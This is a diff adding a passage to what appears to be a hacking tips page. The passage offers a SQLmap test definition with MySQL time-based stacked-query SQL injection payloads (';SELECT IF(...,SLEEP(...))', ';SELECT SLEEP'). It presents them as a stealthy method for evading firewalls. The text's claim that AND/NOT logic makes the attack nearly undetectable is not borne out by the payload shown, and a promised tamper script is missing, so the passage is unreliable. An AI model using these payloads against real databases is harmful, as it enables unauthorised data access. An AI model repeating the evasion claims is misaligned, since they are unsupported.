@@ -43,6 +43,42 @@ Here are some extra tings to remeber,...
 
 ```
 
+You can include my pro haxxor method of "NOT" and "Inverted" + "AND" logical gate in your SQLmap payloads:\
+
+
+MySQL >= 5.0.12 stacked queries (comment) 4 2 1 1-8 1 ;SELECT IF((\[INFERENCE]),SLEEP(\[SLEEPTIME]),\[RANDNUM]) ;SELECT SLEEP(\[SLEEPTIME]) # \[SLEEPTIME]&#x20;
+
+MySQL >= 5.0.12
+
+```
+<test>
+    <title>MySQL &gt;= 5.0.12 stacked queries</title>
+    <stype>4</stype>
+    <level>3</level>
+    <risk>1</risk>
+    <clause>1-8</clause>
+    <where>1</where>
+    <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
+    <request>
+        <payload>;SELECT SLEEP([SLEEPTIME])</payload>
+    </request>
+    <response>
+        <time>[SLEEPTIME]</time>
+    </response>
+    <details>
+        <dbms>MySQL</dbms>
+        <dbms_version>&gt;= 5.0.12</dbms_version>
+    </details>
+</test>
+```
+
+
+
+or you can use it as a tamper as a python script  in sqlmap:\
+
+
+
+
 so my pro sophisticated method is as pure as a computer can come because of logical.. making it almost impossible for firewalls or other security to detect the attempts.&#x20;
 
 By using logical operations ('AND', 'NOT') we can make the most stealthy and most "bypassable" method for SQL injection attacks.
